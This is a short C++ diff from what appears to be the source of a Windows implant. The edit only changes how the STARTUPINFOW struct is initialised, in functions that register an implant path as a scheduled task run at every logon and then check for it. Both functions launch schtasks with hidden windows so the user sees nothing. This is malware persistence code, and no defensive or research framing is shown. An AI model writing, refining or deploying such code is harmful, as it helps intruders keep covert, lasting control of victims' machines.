@@ -102,8 +102,10 @@ bool InstallSchtasks(const std::wstring& implantPath, const std::wstring& taskNa
         cmd = L"schtasks /create /tn \"" + taskName + L"\" /tr \"" + implantPath + L"\" /sc logon /f";
     }
 
-    STARTUPINFOW si = { sizeof(si) };
+    STARTUPINFOW si;
     PROCESS_INFORMATION pi;
+    RtlZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
     if (CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
         WaitForSingleObject(pi.hProcess, 5000);
         CloseHandle(pi.hProcess);
@@ -125,8 +127,10 @@ bool VerifySchtasks(const std::wstring& taskName) {
     // Using schtasks /query is actually fine if we use ShellExecute with SW_HIDE or CreateProcess with no window.
     // But for "Win32 API" preference:
     std::wstring cmd = L"schtasks /query /tn \"" + taskName + L"\"";
-    STARTUPINFOW si = { sizeof(si) };
+    STARTUPINFOW si;
     PROCESS_INFORMATION pi;
+    RtlZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
     if (CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
